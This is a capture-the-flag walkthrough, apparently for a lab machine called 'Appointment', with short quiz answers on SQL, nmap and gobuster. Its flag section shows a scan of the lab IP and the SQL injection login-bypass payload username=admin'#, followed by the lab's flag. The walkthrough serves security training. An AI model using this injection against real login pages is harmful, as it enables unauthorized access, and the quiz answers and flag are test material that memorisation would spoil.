<center>Appointment</center>







[toc]









## Appointment

> Appointment









### 1. task

1. What does the acronym SQL stand for?

```shell
Structured Query Language 
```

2. What is one of the most common type of SQL vulnerabilities?

```shell
SQL injection
```

3. What is the 2021 OWASP Top 10 classification for this vulnerability?

```shell
A03:2021-Injection
```

4. What does Nmap report as the service and version that are running on port 80 of the target?

```shell
nmap -sV -T5 10.129.140.138

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

5. What is the standard port used for the HTTPS protocol?

```shell
443
```

6. What is a folder called in web-application terminology?

```shell
directory
```

7. What is the HTTP response code is given for 'Not Found' errors?

```shell
404
```

8. Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

```shell
dir
```

9. What single character can be used to comment out the rest of a line in MySQL?

```shell
#
```

10. If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?

```shell
Congratulations
```







### 3. flag

> 获取flag

```shell
# 80端口。访问 登陆框，看是否有sql注入。
http://10.129.140.138/

# burp抓包
username=admin&password=admin

# payould
username=admin'#&password=admin

# falg
Congratulations!

Your flag is: e3d0796d002a446c0e622226f42e9672
```



